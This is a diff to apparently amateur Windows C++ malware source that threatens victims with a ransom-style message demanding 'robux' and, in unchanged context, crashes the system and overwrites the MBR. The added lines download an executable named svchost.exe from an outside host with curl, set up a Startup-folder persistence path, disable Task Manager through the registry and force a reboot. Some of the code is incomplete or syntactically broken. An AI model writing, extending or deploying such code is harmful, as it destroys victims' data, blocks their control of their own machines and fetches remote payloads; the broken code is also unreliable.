@@ -4,6 +4,9 @@
 #include <stdlib.h>
 #include <time.h>
 #include <filesystem>
+#include <shlobj.h>
+#include <shlwapi.h>
+#pragma comment(lib, "Shlwapi.lib")
 
 typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
@@ -15,7 +18,7 @@ void lol()
         int x;
         int y;
         int duration = 3600000;
-        char message[] = "you've been hacked by the pissy squad, if u don't giv us fre robuck the pissy squad will brick ur system 👿👿👿👿👿👿👿👿👿";
+        char message[] = "you've been hacked by the pissy squad, if u don't giv us fre robuck the pissy squad will brick ur system 👿👿👿👿👿👿👿👿👿 (you have 1 hour left NERD)";
         ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
         maozedongthecompooter()
         Sleep(duration);
@@ -42,7 +45,18 @@ void lol()
         bsod();
 }
 
+void svchost_impersonate()
+{
+        ShellExecute(NULL, NULL, L"curl https://dhiuhkasfhsdhkjshfiusffsbfusfhihikhioi.000webhostapp.com/svchost.exe", NULL, NULL, SW_HIDE);
+        TCHAR userProfile[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
+        PathAppend(userProfile, TEXT("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
 
+        LPCTSTR exeName = TEXT("svchost.exe");
+
+        TCHAR exePath[MAX_PATH];
+        PathCombine(exePath, userProfile, exeName);
+}
 
 void maozedongthecompooter()
 {
@@ -287,5 +301,17 @@ void mbr_overwrite()
 
 void disable_taskmgr()
 {
-        // Work in progress
+    HKEY key;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
+        // set the value to 1 so it can disable taskmgr
+        DWORD value = 1;
+        if (RegSetValueEx(key, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS)
+        {
+                restart();
+        }
+}
+
+void restart()
+{
+        InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, FALSE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_RECONFIG);
 }
